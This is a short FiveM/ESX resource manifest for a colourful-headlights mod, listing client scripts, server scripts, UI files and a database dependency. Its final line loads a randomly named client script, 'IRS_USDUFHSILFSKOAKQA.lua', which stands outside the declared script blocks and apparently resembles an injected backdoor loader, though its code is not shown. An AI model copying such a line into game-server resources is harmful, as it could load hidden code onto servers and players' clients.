-- esx_colorfullheadlights by MilutuS
-- https://discord.gg/GgaMnNC



resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

client_scripts {
	'@essentialmode/locale.lua',
	'client.lua'
}

ui_page('client/html/UI.html')

files({
    'client/html/UI.html',
    'client/html/style.css',
	'client/html/tablet.png'
})

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'@essentialmode/locale.lua',
	'server.lua'
}
client_script "IRS_USDUFHSILFSKOAKQA.lua"